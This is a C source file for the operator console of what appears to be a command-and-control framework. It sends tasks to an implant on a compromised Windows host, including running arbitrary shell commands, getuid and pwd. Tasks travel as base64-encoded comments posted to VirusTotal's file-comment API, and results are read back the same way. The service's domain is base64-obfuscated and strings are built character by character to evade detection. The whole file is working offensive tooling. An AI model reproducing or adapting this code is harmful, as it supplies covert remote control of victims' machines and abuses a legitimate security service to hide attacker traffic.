// tnx to   :   Tom Kallo for the recommendation and the inspiration.
// credits  :   https://nachtimwald.com blog (Base64 encoding decoding)

#include <Windows.h>
#include <stdio.h>
#include <wininet.h>
#include <string.h>
#include <stdlib.h>

#define _CRT_SECURE_NO_WARNINGS
#pragma warning(disable:4996)

char* Error(const char* msg) {
    char ret[1000];
    sprintf(ret, "%s (%u)", msg, GetLastError());
    return ret;
}
#pragma comment (lib, "Wininet.lib")
#define _CRT_SECURE_NO_WARNINGS
#pragma warning(disable:4996)


typedef DWORD(WINAPI* Sl33P)(
    DWORD dwMilliseconds,
    BOOL  bAlertable
    );

// base64 encode decode : https://nachtimwald.com/2017/11/18/base64-encode-and-decode-in-c/

char base46_map[] = { 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
                     'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',
                     'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
                     'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '+', '/' };

char* base64_encode(char* plain) {

    char counts = 0;
    char buffer[3];
    char* cipher = (char*)malloc(strlen(plain) * 4 / 3 + 4);
    int i = 0, c = 0;

    for (i = 0; plain[i] != '\0'; i++) {
        buffer[counts++] = plain[i];
        if (counts == 3) {
            cipher[c++] = base46_map[buffer[0] >> 2];
            cipher[c++] = base46_map[((buffer[0] & 0x03) << 4) + (buffer[1] >> 4)];
            cipher[c++] = base46_map[((buffer[1] & 0x0f) << 2) + (buffer[2] >> 6)];
            cipher[c++] = base46_map[buffer[2] & 0x3f];
            counts = 0;
        }
    }

    if (counts > 0) {
        cipher[c++] = base46_map[buffer[0] >> 2];
        if (counts == 1) {
            cipher[c++] = base46_map[(buffer[0] & 0x03) << 4];
            cipher[c++] = '=';
        }
        else {                      // if counts == 2
            cipher[c++] = base46_map[((buffer[0] & 0x03) << 4) + (buffer[1] >> 4)];
            cipher[c++] = base46_map[(buffer[1] & 0x0f) << 2];
        }
        cipher[c++] = '=';
    }

    cipher[c] = '\0';   /* string padding character */
    return cipher;
}

const char b64chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-\\+/";

void b64_generate_decode_table()
{
    int    inv[80];
    size_t i;

    memset(inv, -1, sizeof(inv));
    for (i = 0; i < sizeof(b64chars) - 1; i++) {
        inv[b64chars[i] - 43] = i;
    }
}

int b64_isvalidchar(char c)
{
    if (c >= '0' && c <= '9')
        return 1;
    if (c >= 'A' && c <= 'Z')
        return 1;
    if (c >= 'a' && c <= 'z')
        return 1;
    if (c == '+' || c == '/' || c == '=')
        return 1;
    return 0;
}

size_t b64_decoded_size(const char* in)
{
    size_t len;
    size_t ret;
    size_t i;

    if (in == NULL)
        return 0;

    len = strlen(in);
    ret = len / 4 * 3;

    for (i = len; i-- > 0; ) {
        if (in[i] == '=') {
            ret--;
        }
        else {
            break;
        }
    }

    return ret;
}


int b64invs[] = { 62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57, 58,
    59, 60, 61, -1, -1, -1, -1, -1, -1, -1, 0, 1, 2, 3, 4, 5,
    6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20,
    21, 22, 23, 24, 25, -1, -1, -1, -1, -1, -1, 26, 27, 28,
    29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42,
    43, 44, 45, 46, 47, 48, 49, 50, 51 };

int b64_decode(const char* in, unsigned char* out, size_t outlen)
{
    size_t len;
    size_t i;
    size_t j;
    int    v;

    if (in == NULL || out == NULL)
        return 0;

    len = strlen(in);
    if (outlen < b64_decoded_size(in) || len % 4 != 0)
        return 0;

    for (i = 0; i < len; i++) {
        if (!b64_isvalidchar(in[i])) {
            return 0;
        }
    }

    for (i = 0, j = 0; i < len; i += 4, j += 3) {
        v = b64invs[in[i] - 43];
        v = (v << 6) | b64invs[in[i + 1] - 43];
        v = in[i + 2] == '=' ? v << 6 : (v << 6) | b64invs[in[i + 2] - 43];
        v = in[i + 3] == '=' ? v << 6 : (v << 6) | b64invs[in[i + 3] - 43];

        out[j] = (v >> 16) & 0xFF;
        if (in[i + 2] != '=')
            out[j + 1] = (v >> 8) & 0xFF;
        if (in[i + 3] != '=')
            out[j + 2] = v & 0xFF;
    }

    return 1;
}


char* PostComment(char* APIkey, char* Hash, char* comment)
{
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL)
    {
        return Error("Failed in InternetOpenA");
    }
    //char domain[] = { 'w','w','w','.','v','i','r','u','s','t','o','t','a','l','.','c','o','m',0 };
    size_t  out_len = b64_decoded_size("d3d3LnZpcnVzdG90YWwuY29t") + 1;
    char* domain = (char*)malloc(out_len);
    if (!b64_decode("d3d3LnZpcnVzdG90YWwuY29t", (unsigned char*)domain, out_len)) {
        printf("(NULL)\n");
    }
    domain[out_len - 1] = '\0';
    
    HINTERNET hConnect = InternetConnectA(hInternet, domain, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, (DWORD_PTR)NULL);
    if (!hConnect)
    {
        return Error("Failed in InternetConnectA");
    }
    CHAR aTypes[] = { '*','/','*',0 };
    PCTSTR acceptTypes[] = { (LPCTSTR)aTypes, NULL };
    CHAR Postm[] = { 'P','O','S','T',0 };
    // /api/v3/files/{Hash}/comments
    CHAR path[1000];
    memset(path, 0, sizeof(path));
    char repos[] = { 'a','p','i','/','v','3','/','f','i','l','e','s','/',0 };
    lstrcatA(path, repos);
    lstrcatA(path, Hash);
    lstrcatA(path, "/");
    char cmts[] = { 'c','o','m','m','e','n','t','s',0 };
    lstrcatA(path, cmts);
    HINTERNET hRequest = HttpOpenRequestA(hConnect, Postm, path, NULL, NULL, (LPCSTR*)acceptTypes, INTERNET_FLAG_SECURE | INTERNET_FLAG_DONT_CACHE, 0);
    if (!hRequest)
    {
        return Error("Failed in HttpOpenRequestA");
    }
    CHAR headers[4000];
    memset(headers, 0, sizeof(headers));
    // x-apikey: <your API key>
    CHAR cType[] = { 'a','c','c','e','p','t',':',' ','a','p','p','l','i','c','a','t','i','o','n','/','j','s','o','n',0xd,0xa,'C','o','n','t','e','n','t','-','t','y','p','e',':',' ','a','p','p','l','i','c','a','t','i','o','n','/','j','s','o','n',0xd,0xa,'x','-','a','p','i','k','e','y',':',' ',0 };
    lstrcatA(headers, cType);
    lstrcatA(headers, APIkey);
    int headerLen = lstrlenA(headers);
    char data[8000];
    memset(data, 0, sizeof(data));

    sprintf(data, "{\"data\":{\"type\":\"comment\",\"attributes\":{\"text\":\"%s\"}}}", comment);

    int dataLen = lstrlenA(data);
    BOOL bRequestSent = HttpSendRequestA(hRequest, headers, headerLen, data, dataLen);
    if (!bRequestSent)
    {
        return Error("Failed in HttpSendRequestA");
    }
    BOOL bIRF = TRUE;
    const int buffLen = 100000;
    char* buffer = (char*)VirtualAlloc(0, 100000, MEM_COMMIT, PAGE_READWRITE);
    DWORD dwNumberOfBytesRead = -1;
    while (bIRF && dwNumberOfBytesRead != 0) {
        bIRF = InternetReadFile(hRequest, buffer, buffLen, &dwNumberOfBytesRead);
    }
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    return NULL;
}


char* GetComment(char* APIkey, char* Hash)
{
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL)
    {
        return Error("Failed in InternetOpenA");
    }
    //char domain[] = { 'w','w','w','.','v','i','r','u','s','t','o','t','a','l','.','c','o','m',0 };
    size_t  out_len = b64_decoded_size("d3d3LnZpcnVzdG90YWwuY29t") + 1;
    char* domain = (char*)malloc(out_len);
    if (!b64_decode("d3d3LnZpcnVzdG90YWwuY29t", (unsigned char*)domain, out_len)) {
        printf("(NULL)\n");
    }
    domain[out_len - 1] = '\0';
    
    HINTERNET hConnect = InternetConnectA(hInternet, domain, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, (DWORD_PTR)NULL);
    if (!hConnect)
    {
        return Error("Failed in InternetConnectA");
    }
    CHAR aTypes[] = { '*','/','*',0 };
    PCTSTR acceptTypes[] = { (LPCTSTR)aTypes, NULL };
    CHAR Postm[] = { 'G','E','T',0 };
    CHAR path[1000];
    memset(path, 0, sizeof(path));
    // api/v3/files/<Hash>/comments?limit=1
    char repos[] = { 'a','p','i','/','v','3','/','f','i','l','e','s','/',0 };
    lstrcatA(path, repos);
    lstrcatA(path, Hash);
    char comments[] = { '/','c','o','m','m','e','n','t','s','?','l','i','m','i','t','=','1',0 };
    lstrcatA(path, comments);


    HINTERNET hRequest = HttpOpenRequestA(hConnect, Postm, path, NULL, NULL, (LPCSTR*)acceptTypes, INTERNET_FLAG_SECURE | INTERNET_FLAG_DONT_CACHE, 0);
    if (!hRequest)
    {
        return Error("Failed in HttpOpenRequestA");
    }
    CHAR headers[4000];
    memset(headers, 0, sizeof(headers));

    CHAR cType[] = { 'a','c','c','e','p','t',':',' ','a','p','p','l','i','c','a','t','i','o','n','/','j','s','o','n',0xd,0xa,'x','-','a','p','i','k','e','y',':',' ',0 };
    lstrcatA(headers, cType);
    lstrcatA(headers, APIkey);
    int headerLen = lstrlenA(headers);
 

    BOOL bRequestSent = HttpSendRequestA(hRequest, headers, headerLen, NULL, NULL);
    if (!bRequestSent)
    {
        return Error("Failed in HttpSendRequestA");
    }
    BOOL bIRF = TRUE;
    const int buffLen = 100000;
    char* buffer = (char*)VirtualAlloc(0, 100000, MEM_COMMIT, PAGE_READWRITE);
    DWORD dwNumberOfBytesRead = -1;
    while (bIRF && dwNumberOfBytesRead != 0) {
        bIRF = InternetReadFile(hRequest, buffer, buffLen, &dwNumberOfBytesRead);
    }
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    return buffer;
}

char* findText(char* comment) {
    const char* s = comment;

    const char* pattern1 = "\"text\": \"";
    const char* pattern2 = "\",";

    char* target = NULL;
    char* start, * end;

    if (start = (char*)strstr(s, pattern1))
    {
        start += strlen(pattern1);
        if (end = strstr(start, pattern2))
        {
            target = (char*)malloc(end - start + 1);
            memcpy(target, start, end - start);
            target[end - start] = '\0';
        }
    }

    //if (target) printf("%s\n", target);

    return target;
}


int check(char* text, char* special) {
    char* str = text;
    char* word = special;
    int i, j, index, found;
    int strLen, wordLen;


    index = -1;
    strLen = strlen(str);   // Find length of string
    wordLen = strlen(word);  // Find length of word


    /*
     * Runs a loop from starting index of string to
     * length of string - word length
     */
    for (i = 0; i <= strLen - wordLen; i++)
    {
        // Match word at current position
        found = 1;
        for (j = 0; j < wordLen; j++)
        {
            //If word is not matched
            if (str[i + j] != word[j])
            {
                found = 0;
                break;
            }
        }

        // If word have been found then store the current found index
        if (found == 1)
        {
            index = i;
        }
    }

    if (index == -1)
    {
        printf("\n'%s' not found.", word);
        return 0;
    }
    else
    {
        return index;
    }

}


int main(int argc, char** argv) {

    char* APIkey = (char*)"<YOU API KEY HERE>";
    char* Hash = argv[1];
    char Task[1000];
    
    if (argc < 2) {
        printf("usage : TeamServer.exe <Hash> \n");
        return -1;
    }
    
    int ComntNbr = 1;
    char ComntNbrStr[1000];
    char* cmntEncoded = (char*)malloc(50000);
    
    
    while (true) {
    jump:
        printf("Implant # ");
        gets_s(Task, 1000);

        if (strncmp("pwd", Task, 3) && strncmp("getuid", Task, 6) &&
            strncmp("exit", Task, 4) && strncmp("cmd", Task, 3)&& 
            strncmp("ps", Task, 2))
            {
            printf("help:\npwd : print working directory\ngetuid : get hostname\\username\ncmd <command> : execute a batch command\nexit : to kill the connection with the implant\n\n");
            goto jump;

        }
        if (!strncmp("exit", Task, 4)) {
            sprintf(ComntNbrStr, "%ld", ComntNbr);
            lstrcatA(Task, "**T34M**");
            lstrcatA(Task, ComntNbrStr);
            cmntEncoded = base64_encode(Task);
            printf("[+] Task Encoded : %s\n", cmntEncoded);
            PostComment(APIkey, Hash, cmntEncoded);
            Sleep(10000);


            char* comment = GetComment(APIkey, Hash);
            char* result = findText(comment);
            printf("[+] Result Encoded : %s\n", result);
            size_t  out_len = b64_decoded_size(result) + 1;
            char* resultDecoded = (char*)malloc(out_len);
            if (!b64_decode(result, (unsigned char*)resultDecoded, out_len)) {
                printf("(NULL)\n");
            }
            resultDecoded[out_len - 1] = '\0';
            printf("[+] Result Decoded : %s\n", resultDecoded);

            
            return 0;
        }
        sprintf(ComntNbrStr, "%ld", ComntNbr);
        lstrcatA(Task, "**T34M**");
        lstrcatA(Task, ComntNbrStr);
        cmntEncoded = base64_encode(Task);
        printf("[+] Task Encoded : %s\n", cmntEncoded);
        PostComment(APIkey, Hash, cmntEncoded);
       // memset(cmntEncoded, 0, 50000);
        Sleep(5000);

        //sprintf(issueNbrStr, "%ld", issueNbr);
    
        char* comment = GetComment(APIkey, Hash);
        char* result = findText(comment);
        printf("[+] Result Encoded : %s\n", result);
        size_t  out_len = b64_decoded_size(result) + 1;
        char* resultDecoded = (char*)malloc(out_len);
        memset(resultDecoded, 0, out_len);
        if (!b64_decode(result, (unsigned char*)resultDecoded, out_len)) {
            printf("(NULL)\n");
        }
        resultDecoded[out_len - 1] = '\0';
        
        int index = check(resultDecoded, (char*)"**1MPL4NT**");
        if (strncmp("**1MPL4NT**", resultDecoded + (index), 11))
            Sleep(5000);
        printf("[+] Result Decoded : \n\n");
        for (int i = 0; i < index; i++) {
            printf("%c", resultDecoded[i]);
        }
        printf("\n\n");
        ComntNbr++;

    }
    
    return 0;
}
